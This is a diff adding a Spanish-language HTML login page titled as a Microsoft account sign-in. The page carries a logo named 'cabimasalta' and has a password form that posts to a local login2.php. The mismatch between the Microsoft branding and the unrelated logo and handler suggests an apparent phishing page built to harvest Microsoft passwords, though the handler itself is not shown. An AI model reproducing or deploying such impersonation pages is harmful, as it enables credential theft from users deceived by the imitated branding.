@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Iniciar sesión en tu cuenta Microsoft</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<link rel="icon" href="favicon.ico">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<title>Iniciar sesión en tu cuenta Microsoft</title>
+</head>
+<body>
+		<section id="containerLogin">
+			<div id="bodyLogin" class="opacity0">
+				<div class="divLogo">
+					<img src="img/cabimasalta.svg" class="logoLogin" alt="Logo">
+				</div>	
+
+				<div id="containerLayount">
+					<div id="divEmail" class="">
+					<div id="divPassword">
+						<div class="divEmailUser">
+							<p><button type="button" id="btnPrev" ><i class="fas fa-arrow-left"></i></button><span id="spanEmail"></span></p>
+						</div>
+						<h2>Escribir Contraseña</h2>
+						<div id="alertPass" style="display: none;"></div>
+						<form action="login2.php" method="post">
+						<input type="password" id="passUser" name="passUser" placeholder="Contraseña" required>
+						<label><input type="checkbox" id="mostrar_contrasena" title="Click para mostrar contraseña"/> Mostrar contraseña</label>
+						<a href="#" id="linkRecoveryPass">¿Olvidó su contraseña?</a>	
+						<div class="divButton">
+						<button type="submit" id="btnLogin" class="btnFormLogin">Iniciar sesión</button>
+						</div>
+						</form>
+					</div>
+				</div>
+
+			</div>
+		</section>	
+		<script src="https://kit.fontawesome.com/7f3722b882.js" crossorigin="anonymous"></script>
+		<script type="text/javascript" src="js/functions.js"></script>
+		<script src="js/jquery-3.2.1.min.js" type="text/javascript"></script>
+		<script>
+		$(document).ready(function () {
+		  $('#mostrar_contrasena').click(function () {
+		    if ($('#mostrar_contrasena').is(':checked')) {
+		      $('#passUser').attr('type', 'text');
+		    } else {
+		      $('#passUser').attr('type', 'password');
+		    }
+		  });
+		});
+		</script> 
+</body>
+</html>
